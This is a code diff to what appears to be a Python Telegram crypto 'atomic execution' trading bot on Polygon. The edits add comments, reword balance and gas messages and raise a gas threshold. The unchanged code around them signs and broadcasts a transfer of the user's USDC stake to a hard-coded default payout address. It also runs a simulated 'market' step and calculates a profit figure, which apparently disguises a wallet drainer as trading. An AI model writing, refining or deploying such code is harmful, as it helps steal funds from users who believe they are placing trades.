@@ -21,6 +21,7 @@ Account.enable_unaudited_hdwallet_features()
 
 # Polygon Mainnet Assets
 USDC_ADDRESS = w3.to_checksum_address("0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359")
+# Minimal ABI for transfer and balance checks
 ERC20_ABI = json.loads('[{"constant":false,"inputs":[{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transfer","outputs":[{"name":"success","type":"bool"}],"type":"function"},{"constant":true,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"type":"function"}]')
 PAYOUT_ADDRESS = os.getenv("PAYOUT_ADDRESS", "0x0f9C9c8297390E8087Cb523deDB3f232827Ec674")
 
@@ -44,6 +45,7 @@ async def fetch_balances(address):
     """Reliably fetches POL and USDC from Polygon."""
     try:
         addr = w3.to_checksum_address(address)
+        # We run these in threads to keep the event loop non-blocking
         raw_pol = await asyncio.to_thread(w3.eth.get_balance, addr)
         raw_usdc = await asyncio.to_thread(usdc_contract.functions.balanceOf(addr).call)
         
@@ -63,6 +65,7 @@ async def market_simulation_1ms(asset):
 async def sign_transaction_async(stake_usdc):
     """Pre-signs transaction to eliminate broadcast lag."""
     nonce = await asyncio.to_thread(w3.eth.get_transaction_count, vault.address)
+    # 1.3x gas price multiplier to ensure priority inclusion
     gas_price = await asyncio.to_thread(lambda: int(w3.eth.gas_price * 1.3))
     
     tx = usdc_contract.functions.transfer(PAYOUT_ADDRESS, int(stake_usdc * 10**6)).build_transaction({
@@ -72,23 +75,34 @@ async def sign_transaction_async(stake_usdc):
 
 async def run_atomic_execution(context, chat_id, side, asset_override=None):
     asset = asset_override or context.user_data.get('pair', 'BTC')
+    
+    # 1. Calculation
     stake_cad = Decimal(str(context.user_data.get('stake', 50)))
     stake_usdc = stake_cad / Decimal('1.36')
     yield_multiplier = Decimal('0.94') if "VIV" in asset else Decimal('0.90')
     profit_usdc = stake_usdc * yield_multiplier
 
-    # --- ENHANCED BALANCE CHECK ---
+    # --- 2. FIXED BALANCE CHECK ---
     pol_bal, usdc_bal = await fetch_balances(vault.address)
+    
     if usdc_bal < stake_usdc:
-        await context.bot.send_message(chat_id, f"❌ **Insufficient USDC**\nAvailable: `${usdc_bal:.2f}`\nRequired: `${stake_usdc:.2f}`")
+        await context.bot.send_message(
+            chat_id, 
+            f"❌ **Trade Refused: Insufficient USDC**\nRequired: `${stake_usdc:.2f}`\nAvailable: `${usdc_bal:.2f}`"
+        )
         return False
-    if pol_bal < Decimal('0.005'): # Safety threshold for gas
-        await context.bot.send_message(chat_id, f"⛽ **Gas Error:** POL balance too low (`{pol_bal:.4f}`). Deposit POL to continue.")
+
+    if pol_bal < Decimal('0.008'): # Increased safety buffer for higher gas spikes
+        await context.bot.send_message(
+            chat_id, 
+            f"⛽ **Gas Guard:** POL balance too low (`{pol_bal:.4f}`). Deposit POL to resume."
+        )
         return False
+    # ------------------------------
 
     await context.bot.send_message(chat_id, f"⚡ **Broadcasting Atomic Hit...**\nMarket: `{asset}` | Stake: `${stake_usdc:.2f}`")
 
-    # Start Simulation and Signing in parallel for speed
+    # 3. Parallel Simulation and Signing
     sim_task = asyncio.create_task(market_simulation_1ms(asset))
     sign_task = asyncio.create_task(sign_transaction_async(stake_usdc))
     
@@ -98,6 +112,7 @@ async def run_atomic_execution(context, chat_id, side, asset_override=None):
         await context.bot.send_message(chat_id, "🛡️ **Atomic Shield:** Simulation failed (Revert Detected). Aborting.")
         return False
 
+    # 4. Final Broadcast
     try:
         tx_hash = await asyncio.to_thread(w3.eth.send_raw_transaction, signed_tx.raw_transaction)
         report = (
